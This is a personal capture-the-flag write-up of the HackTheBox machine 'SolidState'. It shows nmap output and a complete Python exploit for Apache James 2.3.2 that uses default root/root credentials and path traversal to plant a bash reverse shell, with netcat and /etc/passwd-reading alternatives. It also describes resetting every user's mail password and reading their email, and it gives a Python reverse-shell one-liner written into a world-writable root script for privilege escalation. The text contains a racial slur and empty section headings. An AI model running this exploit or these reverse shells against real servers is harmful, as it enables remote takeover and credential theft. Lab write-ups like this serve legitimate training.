+++
title = "HTB - SolidState"
date = 2024-09-11
+++

#linux #manual 
### Scan
```
└─# nmap -sC -sV --open -p- 10.10.10.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 11:54 EDT
Nmap scan report for 10.10.10.51
Host is up (0.14s latency).
Not shown: 64818 closed tcp ports (reset), 712 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.3 [10.10.14.3])
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.94SVN%I=7%D=9/11%Time=66E1BD82%P=aarch64-unknown-linux
SF:-gnu%r(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\
SF:.3\.2\nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id
SF::\nPassword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 309.20 seconds

```
### Enumeration
petential RCE from edb


tryna enum from port 4555<img alt="Image" async src="images/Screenshot 2024-09-11 at 12.56.11 PM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-11 at 12.55.44 PM.png" width="800px"></img>

set up python script and listener (dont forget to wrap like i did :P)

```
import socket
import sys
import time
 
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'
 
if len(sys.argv) != 4:
    sys.stderr.write("[-]Usage: python3 %s <remote ip> <local ip> <local listener port>\n" % sys.argv[0])
    sys.stderr.write("[-]Example: python3 %s 172.16.1.66 172.16.1.139 443\n" % sys.argv[0])
    sys.stderr.write("[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\n")
    sys.exit(1)
 
remote_ip = sys.argv[1]
local_ip = sys.argv[2]
port = sys.argv[3]
 
# Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH)
payload = '/bin/bash -i >& /dev/tcp/' + local_ip + '/' + port + ' 0>&1' # basic bash reverse shell exploit executes after user login
#payload = 'nc -e /bin/sh ' + local_ip + ' ' + port # basic netcat reverse shell
#payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and connectivity
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # proof of concept exploit on root user login only
 
print ("[+]Payload Selected (see script for more options): ", payload)
if '/bin/bash' in payload:
    print ("[+]Example netcat listener syntax to use after successful execution: nc -lvnp", port)
 
 
def recv(s):
        s.recv(1024)
        time.sleep(0.2)
 
try:
    print ("[+]Connecting to James Remote Administration Tool...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary.
    s.recv(1024)
    s.send((user + "\n").encode('utf-8'))
    s.recv(1024)
    s.send((pwd + "\n").encode('utf-8'))
    s.recv(1024)
    print ("[+]Creating user...")
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n".encode('utf-8'))
    s.recv(1024)
    s.send("quit\n".encode('utf-8'))
    s.close()
 
    print ("[+]Connecting to James SMTP server...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary.
    s.send("ehlo team@team.pl\r\n".encode('utf-8'))
    recv(s)
    print ("[+]Sending payload...")
    s.send("mail from: <'@team.pl>\r\n".encode('utf-8'))
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n".encode('utf-8')) if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n".encode('utf-8'))
    recv(s)
    s.send("data\r\n".encode('utf-8'))
    recv(s)
    s.send("From: team@team.pl\r\n".encode('utf-8'))
    s.send("\r\n".encode('utf-8'))
    s.send("'\n".encode('utf-8'))
    s.send((payload + "\n").encode('utf-8'))
    s.send("\r\n.\r\n".encode('utf-8'))
    recv(s)
    s.send("quit\r\n".encode('utf-8'))
    recv(s)
    s.close()
    print ("[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).")
    if '/bin/bash' in payload:
        print ("[+]Don't forget to start a listener on port", port, "before logging in!")
except:
    print ("Connection failed.")
```

netcat into box and change passwords of all users to `password`
<img alt="Image" async src="images/Screenshot 2024-09-11 at 1.38.31 PM.png" width="800px"></img>

Now, we need to telnet into the mail server via pop3 on port 110. <img alt="Image" async src="images/Screenshot 2024-09-11 at 1.39.52 PM.png" width="800px"></img> 

`USER mindy` then type '`PASS password`'

we can poke around these user's emails using `LIST` and `RETR`
ssh creds <img alt="Image" async src="images/Screenshot 2024-09-11 at 1.41.52 PM.png" width="800px"></img>

Once we log in, our script from earlier triggers our listener!
<img alt="Image" async src="images/Screenshot 2024-09-11 at 1.43.23 PM.png" width="800px"></img>

<img alt="Image" async src="images/Screenshot 2024-09-11 at 1.44.01 PM.png" width="800px"></img>
`USER:c2a02b6aac5efe90cc11717f43994eaa`

serve linpeas 

serve linenum
both didnt work



talk about opt and other common to check like /srv/ and /dev/

<img alt="Image" async src="images/Screenshot 2024-09-11 at 2.07.06 PM.png" width="800px"></img>

we see py script with read and write all perms

pspy

python reverse shell one liner 
```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.3',9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > tmp.py
```

wait a few mins with wrapped listener

<img alt="Image" async src="images/Screenshot 2024-09-11 at 2.15.11 PM.png" width="800px"></img>

boom niga

`ROOT:08bae8a910f1847604ff24468d51688c`





### Initial Access

### Privilege Escalation